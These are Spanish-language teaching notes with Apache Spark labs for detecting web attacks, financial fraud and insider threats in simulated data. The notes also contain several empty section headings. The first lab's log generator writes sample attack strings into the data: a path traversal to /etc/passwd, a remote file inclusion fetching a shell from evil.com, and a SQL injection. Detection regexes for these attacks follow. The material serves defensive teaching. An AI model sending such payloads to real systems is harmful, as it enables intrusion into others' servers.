# Detección de amenazas en logs web con Apache Spark

Ejemplo práctico de **análisis de seguridad usando Apache Spark** sin scripts externos.  
Se generarán **200 logs simulados**, algunos con comportamiento normal y otros con ataques.

Se detectarán:

- SQL Injection
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- Path Traversal
- Escaneo de vulnerabilidades
- IPs con actividad sospechosa

---

# 1. Arrancar Spark con Docker

```bash
docker run -it --rm -p 4040:4040 apache/spark:latest bash
```

Entrar en el shell interactivo de Spark:

```bash
spark-shell
```

---

# 2. Generar un archivo con 200 logs simulados

Salir temporalmente del shell de Spark o abrir otra terminal en el contenedor.

```bash
nano generar_logs.sh
```

Contenido:

```bash
#!/bin/bash

rm -f web_logs.txt

for i in {1..200}
do
    ip="192.168.1.$((RANDOM%20+1))"

    tipo=$((RANDOM%6))

    case $tipo in
        0)
            echo "$ip GET /index.php" >> web_logs.txt
            ;;
        1)
            echo "$ip GET /login.php" >> web_logs.txt
            ;;
        2)
            echo "$ip GET /index.php?page=../../etc/passwd" >> web_logs.txt
            ;;
        3)
            echo "$ip GET /index.php?page=http://evil.com/shell.txt" >> web_logs.txt
            ;;
        4)
            echo "$ip GET /login.php?user=admin' OR 1=1 --" >> web_logs.txt
            ;;
        5)
            echo "$ip GET /phpmyadmin" >> web_logs.txt
            ;;
    esac
done
```

Ejecutar:

```bash
chmod +x generar_logs.sh
./generar_logs.sh
```

Comprobar:

```bash
wc -l web_logs.txt
```

Debe mostrar:

```
200 web_logs.txt
```

---

# 3. Cargar logs en Spark

Volver a `spark-shell`.

```scala
val logs = spark.read.text("web_logs.txt")
logs.show(20,false)
```

---

# 4. Detectar ataques LFI / Path Traversal

```scala
logs.filter($"value".rlike("\\.\\./|/etc/passwd")).show(false)
```

Detecta accesos sospechosos a archivos del sistema.

---

# 5. Detectar Remote File Inclusion (RFI)

```scala
logs.filter($"value".rlike("http://|https://")).show(false)
```

Detecta intentos de cargar código remoto.

---

# 6. Detectar SQL Injection

```scala
logs.filter($"value".rlike("(?i)(union|select|or 1=1|--)")).show(false)
```

Detecta patrones típicos de inyección SQL.

---

# 7. Detectar escaneo de vulnerabilidades

```scala
logs.filter($"value".rlike("phpmyadmin|wp-login")).show(false)
```

Detecta bots buscando paneles de administración.

---

# 8. Detectar IPs más activas

Extraer IP de cada línea:

```scala
import org.apache.spark.sql.functions._

val ips = logs.withColumn("ip", split($"value"," ")(0))
```

Contar peticiones:

```scala
ips.groupBy("ip").count().orderBy(desc("count")).show()
```

IPs con muchas peticiones pueden indicar:

- bots
- escaneo automático
- ataques de fuerza bruta

---

# 9. Usar Spark SQL para detección

Registrar tabla:

```scala
logs.createOrReplaceTempView("logs")
```

Consulta para detectar LFI:

```scala
spark.sql("""
SELECT *
FROM logs
WHERE value RLIKE '\\.\\./|/etc/passwd'
""").show(false)
```

Consulta para detectar SQL Injection:

```scala
spark.sql("""
SELECT *
FROM logs
WHERE value RLIKE '(?i)(or 1=1|union|select|--)'
""").show(false)
```

---

# 10. Encontrar IPs con más ataques

```scala
spark.sql("""
SELECT split(value,' ')[0] as ip, COUNT(*) as ataques
FROM logs
WHERE value RLIKE '\\.\\./|http://|or 1=1|phpmyadmin'
GROUP BY ip
ORDER BY ataques DESC
""").show()
```

Esto permite identificar posibles atacantes.

----------
----------

# Anonimización y seudonimización

----------
----------

# Auditoría

----------
----------

# Blockchain para la trazabilidad y el control de datos

----------
----------

#  Cifrado homomórfico para el análisis de datos sin desencriptar

----------
----------

#  Inteligencia artificial para la detección de anomalías y riesgos de privacidad

----------
----------

# Scraping

Recopilación en contextos digitales
Plataformas web y redes sociales

----------
----------

# Python + pandas

----------
----------

# Herramientas básicas de descripción estadística
- Medidas de tendencia central: media, mediana, moda.
- Dispersión: rango, desviación estándar, varianza.
- Forma y distribución: asimetría, curtosis.
- Matrices de correlación, para medir fuerzas y direcciones de asociación.
- Diagramas de dispersión, que revelan patrones lineales o no lineales.
- Mapas de calor, que ayudan a visualizar agrupaciones o tendencias.

----------
----------

# Jupyter

-----------
-----------

# 💳 Detección de transacciones sospechosas con Apache Spark (laboratorio con 200 registros)

Ejemplo práctico de **detección de fraude financiero usando Apache Spark** sin escribir scripts complejos.

Se generarán **200 transacciones simuladas**, algunas normales y otras sospechosas.

El laboratorio detecta:

- transferencias muy grandes
- muchas transacciones desde la misma cuenta
- transacciones nocturnas
- pagos repetidos
- posibles cuentas fraudulentas

---

# 1. Arrancar Spark con Docker

```bash
docker run -it --rm -p 4040:4040 bitnami/spark:latest bash
```

Entrar en el shell interactivo de Spark:

```bash
spark-shell
```

---

# 2. Generar 200 transacciones simuladas

Crear script generador:

```bash
nano generar_transacciones.sh
```

Contenido:

```bash
#!/bin/bash

rm -f transacciones.csv

for i in {1..200}
do

cuenta="ACC$((RANDOM%10+1))"
destino="ACC$((RANDOM%10+1))"
importe=$((RANDOM%9000+10))
hora=$((RANDOM%24))

echo "$cuenta,$destino,$importe,$hora" >> transacciones.csv

done
```

Ejecutar:

```bash
chmod +x generar_transacciones.sh
./generar_transacciones.sh
```

Verificar:

```bash
wc -l transacciones.csv
```

Debe mostrar:

```
200 transacciones.csv
```

Formato del archivo:

```
cuenta_origen,cuenta_destino,importe,hora
```

Ejemplo:

```
ACC1,ACC5,120,14
ACC3,ACC2,9000,3
ACC2,ACC9,300,10
```

---

# 3. Cargar transacciones en Spark

En `spark-shell`:

```scala
import spark.implicits._

val tx = spark.read
.option("inferSchema","true")
.option("header","false")
.csv("transacciones.csv")
.toDF("origen","destino","importe","hora")

tx.show(20,false)
```

---

# 4. Detectar transferencias muy grandes

Por ejemplo mayores de **8000**.

```scala
tx.filter($"importe" > 8000).show()
```

Esto puede indicar:

- fraude
- lavado de dinero
- transferencia anómala

---

# 5. Detectar transacciones nocturnas

Muchos fraudes ocurren en horas poco habituales.

```scala
tx.filter($"hora" < 5).show()
```

---

# 6. Detectar cuentas con muchas transacciones

```scala
tx.groupBy("origen").count().orderBy(desc("count")).show()
```

Una cuenta con demasiadas transacciones puede indicar:

- bots
- cuentas comprometidas
- fraude automatizado

---

# 7. Detectar transferencias repetidas

```scala
tx.groupBy("origen","destino","importe").count()
.filter($"count" > 3)
.show()
```

Esto detecta pagos repetidos sospechosos.

---

# 8. Detectar cuentas que mueven mucho dinero

```scala
tx.groupBy("origen")
.sum("importe")
.orderBy(desc("sum(importe)"))
.show()
```

Esto identifica cuentas con **volumen financiero anómalo**.

---

# 9. Usar Spark SQL para detectar fraude

Registrar tabla:

```scala
tx.createOrReplaceTempView("transacciones")
```

Detectar transferencias grandes:

```scala
spark.sql("""
SELECT *
FROM transacciones
WHERE importe > 8000
""").show()
```

Detectar actividad nocturna:

```scala
spark.sql("""
SELECT *
FROM transacciones
WHERE hora < 5
""").show()
```

Detectar cuentas con muchas transacciones:

```scala
spark.sql("""
SELECT origen, COUNT(*) as total
FROM transacciones
GROUP BY origen
ORDER BY total DESC
""").show()
```

---

# 10. Detectar cuentas potencialmente fraudulentas

Combinar reglas:

```scala
spark.sql("""
SELECT origen,
COUNT(*) as operaciones,
SUM(importe) as volumen
FROM transacciones
GROUP BY origen
HAVING operaciones > 20 OR volumen > 30000
ORDER BY volumen DESC
""").show()
```

Esto detecta cuentas con:

- demasiadas operaciones
- movimiento financiero elevado

------------
------------

# 🧑‍💻 Perfilado de comportamiento de usuarios para detectar amenazas internas con Apache Spark

Laboratorio práctico de **detección de amenazas internas (insider threats)** mediante análisis de comportamiento de usuarios.

Se generarán **200 eventos de actividad** en un sistema corporativo.

Se detectarán comportamientos sospechosos como:

- accesos fuera de horario
- usuarios con demasiadas descargas
- acceso a recursos sensibles
- actividad anómala por volumen
- posibles exfiltraciones de datos

---

# 1. Arrancar Spark con Docker

```bash
docker run -it --rm -p 4040:4040 bitnami/spark:latest bash
```

Entrar en Spark:

```bash
spark-shell
```

---

# 2. Generar 200 eventos de actividad

Crear script:

```bash
nano generar_actividad.sh
```

Contenido:

```bash
#!/bin/bash

rm -f actividad_usuarios.csv

usuarios=("ana" "luis" "marta" "carlos" "elena" "admin")
acciones=("login" "consulta" "descarga" "modificacion")

for i in {1..200}
do

user=${usuarios[$RANDOM % ${#usuarios[@]}]}
accion=${acciones[$RANDOM % ${#acciones[@]}]}
hora=$((RANDOM%24))
archivo="file$((RANDOM%20+1))"

echo "$user,$accion,$archivo,$hora" >> actividad_usuarios.csv

done
```

Ejecutar:

```bash
chmod +x generar_actividad.sh
./generar_actividad.sh
```

Comprobar:

```bash
wc -l actividad_usuarios.csv
```

Debe mostrar:

```
200 actividad_usuarios.csv
```

Formato del dataset:

```
usuario,accion,archivo,hora
```

Ejemplo:

```
ana,login,file3,10
carlos,descarga,file12,3
marta,consulta,file4,14
```

---

# 3. Cargar datos en Spark

En `spark-shell`:

```scala
import spark.implicits._

val actividad = spark.read
.option("inferSchema","true")
.option("header","false")
.csv("actividad_usuarios.csv")
.toDF("usuario","accion","archivo","hora")

actividad.show(20,false)
```

---

# 4. Detectar accesos fuera de horario

Muchos incidentes internos ocurren de madrugada.

```scala
actividad.filter($"hora" < 6).show()
```

---

# 5. Detectar usuarios con muchas descargas

```scala
actividad.filter($"accion" === "descarga")
.groupBy("usuario")
.count()
.orderBy(desc("count"))
.show()
```

Esto puede indicar **posible extracción de información**.

---

# 6. Detectar usuarios con actividad excesiva

```scala
actividad.groupBy("usuario")
.count()
.orderBy(desc("count"))
.show()
```

Usuarios con demasiadas acciones pueden indicar:

- automatización
- cuenta comprometida
- comportamiento anómalo

---

# 7. Detectar acceso repetido al mismo archivo

```scala
actividad.groupBy("usuario","archivo")
.count()
.filter($"count" > 3)
.show()
```

Esto puede indicar interés sospechoso por un recurso.

---

# 8. Detectar descargas nocturnas

```scala
actividad.filter($"accion" === "descarga" && $"hora" < 6).show()
```

Esto es un patrón típico de **exfiltración de datos**.

---

# 9. Usar Spark SQL para análisis de comportamiento

Registrar tabla:

```scala
actividad.createOrReplaceTempView("actividad")
```

Usuarios con muchas descargas:

```scala
spark.sql("""
SELECT usuario, COUNT(*) as descargas
FROM actividad
WHERE accion = 'descarga'
GROUP BY usuario
ORDER BY descargas DESC
""").show()
```

Usuarios con actividad nocturna:

```scala
spark.sql("""
SELECT usuario, COUNT(*) as actividad_nocturna
FROM actividad
WHERE hora < 6
GROUP BY usuario
ORDER BY actividad_nocturna DESC
""").show()
```

---

# 10. Detectar posibles amenazas internas

Combinar reglas de comportamiento:

```scala
spark.sql("""
SELECT usuario,
COUNT(*) as operaciones
FROM actividad
GROUP BY usuario
HAVING operaciones > 40
ORDER BY operaciones DESC
""").show()
```

Usuarios con mucha actividad podrían ser investigados.

-----------
-----------

# Minería descriptiva, predictiva y prescriptiva

-------------
-------------

# Algoritmos de detección de anomalías

El análisis de detección de anomalías tiene como objetivo identificar comportamientos que se alejan de lo normal en comparación con un
patrón esperado. Para ello se emplean distintas técnicas, como el clustering, métodos de estadística multivariante, isolation forest o one-class
SVM, que permiten detectar irregularidades incluso cuando no existen etiquetas previas en los datos.

-------------
-------------

# 💳 Detección de transacciones financieras sospechosas con Apache Spark

Laboratorio práctico de **detección de fraude financiero usando Apache Spark**.

Se simulan **200 transacciones bancarias** y se analizan para detectar:

- transacciones con montos atípicos
- operaciones fuera de horario habitual
- combinaciones sospechosas de cuentas y beneficiarios
- transferencias repetidas entre cuentas
- posibles patrones de fraude

---

# 1. Arrancar Spark con Docker

```bash
docker run -it --rm -p 4040:4040 bitnami/spark:latest bash
```

Entrar en Spark:

```bash
spark-shell
```

---

# 2. Generar dataset de transacciones

Crear script generador:

```bash
nano generar_transacciones.sh
```

Contenido:

```bash
#!/bin/bash

rm -f transacciones.csv

cuentas=("ACC1" "ACC2" "ACC3" "ACC4" "ACC5")
beneficiarios=("BEN1" "BEN2" "BEN3" "BEN4" "BEN5")

for i in {1..200}
do

origen=${cuentas[$RANDOM % ${#cuentas[@]}]}
destino=${beneficiarios[$RANDOM % ${#beneficiarios[@]}]}
importe=$((RANDOM%9000+50))
hora=$((RANDOM%24))

echo "$origen,$destino,$importe,$hora" >> transacciones.csv

done
```

Ejecutar:

```bash
chmod +x generar_transacciones.sh
./generar_transacciones.sh
```

Verificar:

```bash
wc -l transacciones.csv
```

Debe mostrar:

```
200 transacciones.csv
```

Formato del dataset:

```
cuenta_origen,beneficiario,importe,hora
```

Ejemplo:

```
ACC1,BEN2,200,14
ACC3,BEN1,8500,2
ACC2,BEN3,500,11
```

---

# 3. Cargar datos en Spark

En `spark-shell`:

```scala
import spark.implicits._

val tx = spark.read
.option("inferSchema","true")
.option("header","false")
.csv("transacciones.csv")
.toDF("origen","beneficiario","importe","hora")

tx.show(20,false)
```

---

# 4. Detectar montos atípicos

Por ejemplo mayores de **8000**.

```scala
tx.filter($"importe" > 8000).show()
```

Esto puede indicar:

- fraude
- lavado de dinero
- transferencias sospechosas

---

# 5. Detectar transacciones fuera de horario habitual

Muchos fraudes ocurren de madrugada.

```scala
tx.filter($"hora" < 6).show()
```

---

# 6. Detectar combinaciones sospechosas de cuentas y beneficiarios

Buscar cuentas que envían dinero repetidamente al mismo beneficiario.

```scala
tx.groupBy("origen","beneficiario")
.count()
.filter($"count" > 5)
.show()
```

Esto puede indicar:

- cuentas mule
- redes de fraude
- transferencias coordinadas

---

# 7. Detectar beneficiarios que reciben dinero de muchas cuentas

```scala
tx.groupBy("beneficiario")
.count()
.orderBy(desc("count"))
.show()
```

Un beneficiario con muchas transferencias puede indicar **cuenta receptora de fraude**.

---

# 8. Detectar cuentas que mueven grandes cantidades

```scala
tx.groupBy("origen")
.sum("importe")
.orderBy(desc("sum(importe)"))
.show()
```

Esto identifica cuentas con **movimiento financiero anómalo**.

---

# 9. Usar Spark SQL para análisis antifraude

Registrar tabla:

```scala
tx.createOrReplaceTempView("transacciones")
```

Detectar montos sospechosos:

```scala
spark.sql("""
SELECT *
FROM transacciones
WHERE importe > 8000
""").show()
```

Detectar transacciones nocturnas:

```scala
spark.sql("""
SELECT *
FROM transacciones
WHERE hora < 6
""").show()
```

Detectar combinaciones sospechosas:

```scala
spark.sql("""
SELECT origen, beneficiario, COUNT(*) as operaciones
FROM transacciones
GROUP BY origen, beneficiario
HAVING operaciones > 5
ORDER BY operaciones DESC
""").show()
```

---

# 10. Detectar posibles patrones de fraude

Combinar reglas:

```scala
spark.sql("""
SELECT origen,
COUNT(*) as operaciones,
SUM(importe) as volumen
FROM transacciones
GROUP BY origen
HAVING operaciones > 20 OR volumen > 30000
ORDER BY volumen DESC
""").show()
```

Esto permite identificar cuentas con comportamiento anómalo.
